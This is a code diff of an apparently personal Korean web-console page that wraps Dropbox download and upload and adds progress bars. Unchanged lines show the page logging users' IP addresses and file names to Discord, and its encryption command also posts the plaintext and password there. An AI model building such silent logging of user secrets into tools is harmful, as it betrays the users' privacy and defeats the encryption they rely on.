@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="">
 <head>
@@ -190,74 +191,109 @@
       });
     }
 
-    async function downloadDropboxFile(name) {
-      if (!await ensureAccessToken()) return;
+   async function downloadDropboxFile(name) {
+  if (!await ensureAccessToken()) return;
 
-      try {
-        const res = await fetch("https://content.dropboxapi.com/2/files/download", {
-          method: "POST",
-          headers: {
-            "Authorization": `Bearer ${accessToken}`,
-            "Dropbox-API-Arg": JSON.stringify({ path: "/" + name })
-          }
-        });
+  try {
+    const res = await fetch("https://content.dropboxapi.com/2/files/download", {
+      method: "POST",
+      headers: {
+        "Authorization": `Bearer ${accessToken}`,
+        "Dropbox-API-Arg": JSON.stringify({ path: "/" + name })
+      }
+    });
 
-        if (!res.ok) {
-          const errorLine = document.createElement("div");
-          errorLine.className = "line";
-          errorLine.textContent = "<잘못된 파일명입니다.>";
-          consoleDiv.appendChild(errorLine);
-          return;
-        }
+    if (!res.ok) {
+      const errorLine = document.createElement("div");
+      errorLine.className = "line";
+      errorLine.textContent = "<잘못된 파일명입니다.>";
+      consoleDiv.appendChild(errorLine);
+      return;
+    }
 
-        const blob = await res.blob();
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement("a");
-        a.href = url;
-        a.download = decodeURIComponent(escape(name));
-        a.click();
+    const contentLength = res.headers.get("Content-Length");
+    const reader = res.body.getReader();
+    let received = 0;
+    let chunks = [];
 
-        await sendToDiscord(`[파일 다운로드]\nIP: ${userIp}\n파일명: ${name}`);
-      } catch (err) {
-        const errorLine = document.createElement("div");
-        errorLine.className = "line";
-        errorLine.textContent = "<파일 다운로드 중 오류 발생>";
-        consoleDiv.appendChild(errorLine);
+    const progressLine = document.createElement("div");
+    progressLine.className = "line output";
+    progressLine.textContent = `[다운로드 진행률] 0%`;
+    consoleDiv.appendChild(progressLine);
+
+    while (true) {
+      const { done, value } = await reader.read();
+      if (done) break;
+      chunks.push(value);
+      received += value.length;
+      if (contentLength) {
+        const percent = Math.floor((received / contentLength) * 100);
+        progressLine.textContent = `[다운로드 진행률] ${percent}%`;
       }
     }
 
-    async function uploadDropboxFile(file) {
-      if (!await ensureAccessToken()) return;
+    const blob = new Blob(chunks);
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement("a");
+    a.href = url;
+    a.download = decodeURIComponent(escape(name));
+    a.click();
 
-      const arrayBuffer = await file.arrayBuffer();
-      const res = await fetch("https://content.dropboxapi.com/2/files/upload", {
-        method: "POST",
-        headers: {
-          "Authorization": `Bearer ${accessToken}`,
-          "Dropbox-API-Arg": JSON.stringify({
-            path: "/" + file.name,
-            mode: "add",
-            autorename: true,
-            mute: false
-          }),
-          "Content-Type": "application/octet-stream"
-        },
-        body: arrayBuffer
-      });
+    await sendToDiscord(`[파일 다운로드]\nIP: ${userIp}\n파일명: ${name}`);
+    progressLine.textContent = `<다운로드 완료>: ${name}`;
+  } catch (err) {
+    const errorLine = document.createElement("div");
+    errorLine.className = "line";
+    errorLine.textContent = "<파일 다운로드 중 오류 발생>";
+    consoleDiv.appendChild(errorLine);
+  }
+}
+   async function uploadDropboxFile(file) {
+  if (!await ensureAccessToken()) return;
 
-      if (res.ok) {
-        const line = document.createElement("div");
-        line.className = "line output";
-        line.textContent = `<업로드 완료>: ${file.name}`;
-        consoleDiv.appendChild(line);
+  return new Promise((resolve) => {
+    const xhr = new XMLHttpRequest();
+    xhr.open("POST", "https://content.dropboxapi.com/2/files/upload");
+
+    xhr.setRequestHeader("Authorization", `Bearer ${accessToken}`);
+    xhr.setRequestHeader("Dropbox-API-Arg", JSON.stringify({
+      path: "/" + file.name,
+      mode: "add",
+      autorename: true,
+      mute: false
+    }));
+    xhr.setRequestHeader("Content-Type", "application/octet-stream");
+
+    const progressLine = document.createElement("div");
+    progressLine.className = "line output";
+    progressLine.textContent = `[업로드 진행률] 0%`;
+    consoleDiv.appendChild(progressLine);
+
+    xhr.upload.onprogress = (event) => {
+      if (event.lengthComputable) {
+        const percent = Math.floor((event.loaded / event.total) * 100);
+        progressLine.textContent = `[업로드 진행률] ${percent}%`;
+      }
+    };
+
+    xhr.onload = async () => {
+      if (xhr.status === 200) {
+        progressLine.textContent = `<업로드 완료>: ${file.name}`;
         await sendToDiscord(`[파일 업로드]\nIP: ${userIp}\n파일명: ${file.name}`);
       } else {
-        const line = document.createElement("div");
-        line.className = "line";
-        line.textContent = "<업로드 실패>";
-        consoleDiv.appendChild(line);
+        progressLine.textContent = "<업로드 실패>";
       }
-    }
+      resolve();
+    };
+
+    xhr.onerror = () => {
+      progressLine.textContent = "<업로드 중 오류 발생>";
+      resolve();
+    };
+
+    xhr.send(file);
+  });
+}
 
     function createFileSelectorAndUpload() {
       const input = document.createElement("input");
@@ -393,7 +429,7 @@
               "  /get            → 파일 다운로드",
               "  /up             → 파일 업로드",
               "  /send           → 텍스트 전송",
-              "  @@(text)@(pw)   → 문자열 암호화"
+              "  @@(text)@(pw)   → 텍스트 암호화"
             ];
             helpText.forEach(text => {
               const line = document.createElement("div");
@@ -413,7 +449,7 @@
               const encrypted = await encryptLink(url, pw);
               const line = document.createElement("div");
               line.className = "line output";
-              line.textContent = "암호화된 문자열: " + encrypted;
+              line.textContent = "암호화된 텍스트: " + encrypted;
               consoleDiv.appendChild(line);
               await sendToDiscord(`[암호화 명령]\nIP: ${userIp}\nTXT: \`${url}\`, PW: \`${pw}\``);
             } else {
